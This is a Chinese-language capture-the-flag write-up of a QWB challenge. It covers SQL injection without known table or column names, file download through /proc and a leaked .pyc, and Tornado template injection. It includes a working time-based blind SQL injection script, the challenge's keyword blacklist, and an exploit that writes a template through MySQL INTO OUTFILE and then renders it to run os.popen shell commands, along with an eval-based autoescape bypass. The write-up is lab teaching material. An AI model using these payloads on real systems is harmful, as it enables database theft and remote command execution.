## 从qwb重新学习sql和SSTI



### 一、知识点

#### 1.sql注入无列名和表名

#### 2.tornado的SSTI

### 二、解题  

#### 1. sql注入无列名和表名

这里总结一下几个常用的思路.下面先放一下表的结构

![image-20210705202318152](https://i.loli.net/2021/07/05/ZwXpxuSqbryMIF8.png)

(1). 硬做(union注入)

payload：

```
select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1
select `3` from(select 1,2,3 union select * from admin)a limit 1,1

//无逗号，有join版本 核心就是union
select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x;
```

这是有逗号的情况，就是一个简单的重新取名。

![image-20210705202958399](https://i.loli.net/2021/07/05/fLOo7CdiD2IRNWX.png)

假如没有逗号了。使用join来构造一个虚拟表头

![image-20210705203302813](https://i.loli.net/2021/07/05/IvpYGqltwZAJDCP.png)

盲注

```
((SELECT 1,concat('{result+chr(mid)}', cast("0" as JSON)))<(SELECT * FROM `this_fake_flag`))//ascii偏移
```

要求后面select的结果必须是一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用`hex`或者`binary`

这里只能使用`concat`将字符型和binary拼接，使之大小写敏感，`JSON`也可以使用`char byte`代替

(2)报错注入

一般是sql语句查询的时候，出现了相同的列名

`select * from(select * from table1 a join (select * from table1)b)c` CISCN2021的初赛原题罢了

```
获取列名
select * from(select * from table1 a join (select * from table1)b)c
using() 可以把其中已经爆出来的列名的影响取消 

all select * from (select * from users as a join users as b)as c--+
all select*from (select * from users as a join users b using(id,username))c--+
all select*from (select * from users as a join users b using(id,username,password))c--+
```

(3)查询之前的记录

innodb：

```
select table_name from mysql.innodb_table_stats where database_name = database();
select table_name from mysql.innodb_index_stats where database_name = database();
```

sys：

```
//包含in
SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();
SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();

//不包含in
SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();

//通过表文件的存储路径获取表名
这个很常用
SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();
SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
//查询记录
SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();
SELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE();
```

performance_schema：

```
SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();
SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();
SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();
SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();
SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();
//包含之前查询记录的表
SELECT digest_text FROM `performance_schema`.`events_statements_summary_by_digest` WHERE digest_text REGEXP DATABASE();
//包含表文件路径的表
SELECT file_name FROM `performance_schema`.`file_instances` WHERE file_name REGEXP DATABASE();
```

`select%0dInfo%0dfrom%0dinformation_schema.processlist`

补上我的sql注入exp

```
import requests,time

url= "http://192.168.43.221:8080/"
string = "qwertyuiopasdfghjklzxcvbnm1234567890/"
def sql_inject():
	data = ""
	for y in range(70):
		for x in string:
			payload = url + f"register.php?password=1&username=admin' and if(mid((select qwbqwbqwbpass from qwbtttaaab111e limit 0,1),{y},1) in ('{x}'),!sleep(5),1) and '1"
			#payload = url + f"register.php?password=1&username=admin' and if(substr((SELECT digest_text FROM performance_schema.events_statements_summary_by_digest limit 1,1),{y},1) in ('{x}'),!sleep(3),1) and '1"
			start = time.time()
			#print(payload)
			a=requests.get(payload).text
			if("error" in a ):
				print("error")
			if(time.time()-start) > 3:
				data = data + x 
				print(data)
				break
```

#### 2. 任意文件下载

![image-20210705162636359](https://i.loli.net/2021/07/05/Lr6n8YokXbyjBAR.png)

现在第一个想法就是去下载flag，但是很可惜没有。结合提示pyc.

日常读取proc文件

![image-20210705163428162](https://i.loli.net/2021/07/05/qZF8gh7tSKRLpy6.png)

```
拿到了当前的目录
```

再看看当前环境

```
SHELL=/bin/bash
TERM=xterm
Use=MYSQL
....
```

这些信息在后面都有可能会用得到。

现在到这里 我们就应该思考怎么才能拿到源码，来看看还有没有什么没有公布漏洞。

```
__pycache__/app.cpython-{version}.pyc
```

爆破之后面就是x.x 变成xx

![image-20210705163855689](https://i.loli.net/2021/07/05/gmHCsod9JVlfyQp.png)

然后使用在线的反编译工具，进行反编译，即可get源码。

#### 3. tornado的SSTI

这个考点是我没有想到的。因为在网上搜索，我们可以发现其实在平时就没有考过这个除了护网杯，也没有资料查，这让我脚本小子怎么活。

这是tornado对于ssti的支持:https://github.com/tornadoweb/tornado/blob/master/tornado/template.py

首先把已经ban了的拿出来

```
black_func = ['eval', 'os', 'chr', 'class', 'compile', 'dir', 'exec', 'filter', 'attr', 'globals', 'help', 'input', 'local', 'memoryview', 'open', 'print', 'property', 'reload', 'object', 'reduce', 'repr', 'method', 'super', 'vars']
black_symbol = ["__", "'", '"', "$", "*", '{{']
black_keyword = ['or', 'and', 'while']
black_rce = ['render', 'module', 'include', 'raw']
```

出题人很贴心帮我们加了注释，感谢hxd。

我们现在需要做的就是从源码中先找到我们还能够使用的函数，也就是这里的rce

下面贴一下源码所有支持的标签。

```
{##}
{{}}
{%%}
```

我们看到源码发现这个玩意是这么玩的

```
{% func space  suffix%}
```

下面func(operator) 总结

这些都是块的定义

```
intermediate_blocks = {
            "else": set(["if", "for", "while", "try"]),
            "elif": set(["if"]),
            "except": set(["try"]),
            "finally": set(["try"]),
        }
可以比作if 这些语句        
```

rce:

```
"extend " => {% extends *filename* %} 引入模板 只导入{%%}
"include" => 包含文件 就像直接复制进来的一样 {% include *filename* %}
"set" => 设置一个变量
"import" =>和python的一致 导入一个模块(能否配合文件写来命令执行?)
"from" => 通import
"comment" => continue 不要处理 
"autoescape"=>设置整个文件的编码 {%autoescape None%} 关闭整个文件的编码 或者加载单独的函数名 不会影响include的文件
"whitespace"=>空白字符处理
"raw" => 执行python代码 without autoescaping.
"module" => 渲染一个模板{% module Template("foo.html", arg=42) %}
"apply" => {% apply function %}output{% end %} 对于这个块中的输出output
```

以上基本上就是所有的操作名字和一些简单的使用，具体还是得等师傅们使用了之后才会明白。

#### 4 解题完成 

那么这道题到这里 就只剩下了extennds了，我们应该如何去操作这个呢？又没有什么文件给我们用，我们该咋办呢？

前面我们说过了proc目录yyds，我们就是利用前面的我们发现python是mysql用户。那么就可以直接mysql写文件，然后达到任意命令执行。下面附带上exp。

![image-20210705201552390](https://i.loli.net/2021/07/05/Zlnq9eQAcFYCXS8.png)

```
def ssti(payload1,payload2,num):
	s = requests.session()
	print(s.get(url+f"register.php?username=demo{num}&password="+payload1).text)
	print(s.get(url+f"register.php?username=demo{num}' into outfile '/var/lib/mysql-files/demo{num}&password=123").text)
	s.get(url + "login.php?username=admin&password=we111c000me_to_qwb")
	print(s.get(url+"good_job_my_ctfer.php?congratulations="+payload2).text)

if __name__ == '__main__':
	num = random.randint(3,5000)
	system = "cat /flag_qwb/flag"
	payload1 = '{% set return __import__("os").popen("'+system+'").read()%}'
	payload2 = '{% extends /var/lib/mysql-files/demo'+str(num)+' %}'
	ssti(payload1,payload2,num)
```

这样就可以和前面组成一个完整的exp。在mysql中默认导出目录为`/var/lib/mysql-files/`

### 参考资料

https://www.tornadoweb.org/en/stable/template.html?highlight=extends#tornado.template.filter_whitespace

复现环境：https://www.anquanke.com/post/id/244153 感谢大佬开源
 ### 三 提升

下面我们把环境中的黑名单全部撤销掉。来一个一个尝试一下刚才所发的所有payload

首先是简简单单的`inlcude`:

![image-20210705225330835](https://i.loli.net/2021/07/05/vLkRDbuxW4pYCiG.png)

可以看到用法和extends是一样的。

![image-20210705235306152](https://i.loli.net/2021/07/05/6jVzmo2DRf4EbXs.png)每一个禁止的函数都还可以玩。

这里我只是单独地说一下，有关于include的，里面引入的代码会自动解析`{{}}`标签，我们不能将之抹去，那么利用的时候用上来payload来引入文件即可。

`bypass autoescape`：

![image-20210706001852164](https://i.loli.net/2021/07/06/Xloujy78AnEa6it.png)

```
payload = """{% autoescape None %}{% apply eval %}{% set a="__import__(\\\"os\\\").popen(\\\"dir\\\").read()" %}{% end %}"""
```

上传html module联合

还可以继续挖 ：https://www.tornadoweb.org/en/stable/template.html